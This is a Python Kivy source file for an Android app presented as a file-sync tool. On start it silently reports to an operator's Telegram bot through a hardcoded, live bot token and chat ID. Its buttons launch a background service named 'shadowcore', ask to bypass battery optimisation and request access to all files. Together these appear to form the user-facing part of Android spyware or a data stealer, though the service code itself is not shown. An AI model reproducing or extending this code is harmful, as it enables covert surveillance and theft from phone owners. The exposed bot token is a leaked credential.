from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from jnius import autoclass
import requests

BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"

class MyApp(App):

    def build(self):
        layout = BoxLayout(orientation="vertical", padding=20, spacing=15)

        self.status = Label(text="Ready")

        btn_start = Button(text="Start Sync")
        btn_stop = Button(text="Stop Sync")
        btn_battery = Button(text="Disable Battery")
        btn_files = Button(text="Allow File Access")

        btn_start.bind(on_press=self.start_service)
        btn_stop.bind(on_press=self.stop_service)
        btn_battery.bind(on_press=self.disable_battery)
        btn_files.bind(on_press=self.open_files)

        layout.add_widget(self.status)
        layout.add_widget(btn_start)
        layout.add_widget(btn_stop)
        layout.add_widget(btn_battery)
        layout.add_widget(btn_files)

        return layout

    def on_start(self):
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": CHAT_ID, "text": "✅ التطبيق اشتغل"}
            )
        except:
            pass

    def start_service(self, instance):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Service = autoclass('org.test.shadowcore.MyService')
            Service.start(PythonActivity.mActivity, "")
            self.status.text = "Started"
        except Exception as e:
            self.status.text = str(e)

    def stop_service(self, instance):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Service = autoclass('org.test.shadowcore.MyService')
            Service.stop(PythonActivity.mActivity)
            self.status.text = "Stopped"
        except Exception as e:
            self.status.text = str(e)

    def disable_battery(self, instance):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')

            activity = PythonActivity.mActivity
            uri = Uri.parse("package:" + activity.getPackageName())

            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.setData(uri)
            activity.startActivity(intent)

        except Exception as e:
            self.status.text = str(e)

    def open_files(self, instance):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')

            activity = PythonActivity.mActivity
            uri = Uri.parse("package:" + activity.getPackageName())

            intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, uri)
            activity.startActivity(intent)

        except Exception as e:
            self.status.text = str(e)

MyApp().run()
